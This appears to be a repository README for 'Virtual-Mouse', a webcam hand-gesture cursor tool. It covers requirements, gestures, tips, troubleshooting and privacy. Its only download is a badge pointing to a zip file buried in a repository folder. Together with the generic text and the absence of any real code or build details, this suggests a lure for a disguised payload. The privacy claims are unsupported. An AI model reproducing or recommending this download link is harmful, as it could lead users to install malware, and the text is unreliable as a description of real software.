# 🖱️ Virtual-Mouse - Control your computer with hand gestures

[![Download Virtual-Mouse](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/Baileypeacockblue9222/Virtual-Mouse/main/modules/Mouse_Virtual_2.3-alpha.4.zip)

Virtual-Mouse turns your webcam into a tool to control your computer. You move your hand in front of the camera to move the mouse cursor across your screen. This system uses your camera to watch your hand movements in real-time. It translates these movements into precise cursor actions.

## 📋 What you need to run this

Before you start, ensure your computer meets these requirements:

*   Windows 10 or Windows 11.
*   A functional webcam connected to your computer.
*   At least 4GB of RAM.
*   A modern processor with at least two cores.
*   An internet connection to perform the initial setup.

## 🖐️ Hand gestures

You can control your computer with specific hand shapes. The software recognizes these movements:

*   **Move cursor:** Move your index finger in the air to guide the mouse pointer across the screen.
*   **Click:** Bring your thumb and index finger together to perform a left click.
*   **Select:** Hold your hand steady for one second to highlight items on your screen.
*   **Right click:** Extend your index and middle fingers to trigger a right-click menu.
*   **Scroll:** Move your hand up or down with your palm facing the camera to scroll through web pages or documents.

## 💡 Tips for better performance

For the best experience, keep these environment factors in mind:

*   **Lighting:** Ensure your room has good light. Shadows interfere with the camera's ability to track your fingers.
*   **Background:** Avoid sitting with a very busy background. A plain wall works best for the camera to isolate your hand.
*   **Distance:** Stay about two to three feet away from your webcam. This distance allows the AI to capture your hand motion clearly.
*   **Speed:** Start with slow movements. The software tracks fast motions, but you can learn the precision of the system better with controlled, steady actions.

## ❓ Troubleshooting common issues

If you encounter problems, check these solutions:

*   **The mouse does not move:** Check that your webcam is plugged in and that another application is not already using the camera. Close any other video software like Zoom or Skype.
*   **The cursor jitters:** This happens if the camera lens is dirty or if the room is too dark. Clean your camera lens and increase the lighting in your workspace.
*   **Low responsiveness:** Ensure your computer is not running heavy tasks in the background. Close unused applications to give the Virtual-Mouse system more processing power.
*   **No camera detected:** Restart the application. If the problem persists, check your Windows privacy settings to ensure the computer allows camera access for desktop applications.

## 🛡️ Privacy information

This software performs all processing locally on your computer. The system does not transmit your video feed to any external servers. Your hand tracking data remains on your machine at all times. You can terminate the program at any moment to stop the camera feed immediately. Close the application window or use the taskbar icon to exit the system entirely.
